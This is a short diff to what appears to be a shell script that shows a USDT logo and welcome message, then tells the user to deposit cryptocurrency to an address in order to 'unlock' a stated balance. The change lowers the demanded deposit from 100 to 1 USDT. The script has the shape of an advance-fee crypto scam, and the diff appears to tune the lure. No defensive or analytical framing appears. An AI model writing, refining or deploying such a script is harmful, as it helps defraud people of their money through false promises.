@@ -31,7 +31,7 @@ echo -e "$usdt_logo"
 
 fancyBoxEcho "$welcome_message"
 
-echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $account_id"
+echo -e "To unlock your balance of $balance USDT, please deposit 1 USDT to the following address: $account_id"
 
 function unlockBalance {
     echo " "
